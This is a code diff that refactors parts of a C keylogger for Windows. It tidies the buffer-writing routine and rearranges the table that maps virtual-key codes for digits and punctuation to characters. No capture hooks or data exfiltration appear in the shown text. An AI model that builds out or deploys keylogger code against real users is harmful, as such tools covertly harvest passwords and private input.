@@ -123,19 +123,15 @@ char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
  * unprintable key into the key buffer, returing the appropriate code
  */
 ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
+    // write each char of s into the buffer
     char* str = s;
     while (*str != '\0' && kLogger->bufferPtr < MAX_BUFF_LEN - 1) {
-        kLogger->keyBuffer[kLogger->bufferPtr] = *str;
-        // increment buffer ptr and str pointer
-        kLogger->bufferPtr++;
-        str++;
+        kLogger->keyBuffer[kLogger->bufferPtr++] = *str++;
     }
     kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
 
     // if we have hit the end of the buffer return full buff error!
-    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) {
-        return ECODE_FULL_BUFF;
-    }
+    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return ECODE_FULL_BUFF; }
     return ECODE_SUCCESS;
 }
 
@@ -178,26 +174,23 @@ void createKeyPairs(KEY_LOGGER* kLogger) {
     kLogger->keyCodes[VK_INSERT]   = initKeyPair('\0', '\0', "[INSERT]");
     kLogger->keyCodes[VK_DELETE]   = initKeyPair('\0', '\0', "[DELETE]");
     kLogger->keyCodes[VK_SLEEP]    = initKeyPair('\0', '\0', "[SLEEP]");
-    
-    // for these keys the second char is when shift is true, the first is unshift
-    // 0x30 = 0, 0x39 = 9
-    kLogger->keyCodes[0x30] = initKeyPair('0', ')', NULL);
-    kLogger->keyCodes[0x31] = initKeyPair('1', '!', NULL);
-    kLogger->keyCodes[0x32] = initKeyPair('2', '@', NULL);
-    kLogger->keyCodes[0x33] = initKeyPair('3', '#', NULL);
-    kLogger->keyCodes[0x34] = initKeyPair('4', '$', NULL);
-    kLogger->keyCodes[0x35] = initKeyPair('5', '%', NULL);
-    kLogger->keyCodes[0x36] = initKeyPair('6', '^', NULL);
-    kLogger->keyCodes[0x37] = initKeyPair('7', '&', NULL);
-    kLogger->keyCodes[0x38] = initKeyPair('8', '*', NULL);
-    kLogger->keyCodes[0x39] = initKeyPair('9', '(', NULL);
 
-    // range is VK_OEM_1 <-> VK_OEM_7
-    kLogger->keyCodes[VK_OEM_1]      = initKeyPair(';', ':', NULL);
+    kLogger->keyCodes[0x30] = initKeyPair(digits[0], ')', NULL);
+    kLogger->keyCodes[0x31] = initKeyPair(digits[1], '!', NULL);
+    kLogger->keyCodes[0x32] = initKeyPair(digits[2], '@', NULL);
+    kLogger->keyCodes[0x33] = initKeyPair(digits[3], '#', NULL);
+    kLogger->keyCodes[0x34] = initKeyPair(digits[4], '$', NULL);
+    kLogger->keyCodes[0x35] = initKeyPair(digits[5], '%', NULL);
+    kLogger->keyCodes[0x36] = initKeyPair(digits[6], '^', NULL);
+    kLogger->keyCodes[0x37] = initKeyPair(digits[7], '&', NULL);
+    kLogger->keyCodes[0x38] = initKeyPair(digits[8], '*', NULL);
+    kLogger->keyCodes[0x39] = initKeyPair(digits[9], '(', NULL);
+
     kLogger->keyCodes[VK_OEM_PLUS]   = initKeyPair('=', '+', NULL);
     kLogger->keyCodes[VK_OEM_COMMA]  = initKeyPair(',', '<', NULL);
     kLogger->keyCodes[VK_OEM_MINUS]  = initKeyPair('-', '_', NULL);
     kLogger->keyCodes[VK_OEM_PERIOD] = initKeyPair('.', '>', NULL);
+    kLogger->keyCodes[VK_OEM_1]      = initKeyPair(';', ':', NULL);
     kLogger->keyCodes[VK_OEM_2]      = initKeyPair('/', '?', NULL);
     kLogger->keyCodes[VK_OEM_3]      = initKeyPair('`', '~', NULL);
     kLogger->keyCodes[VK_OEM_4]      = initKeyPair('[', '{', NULL);
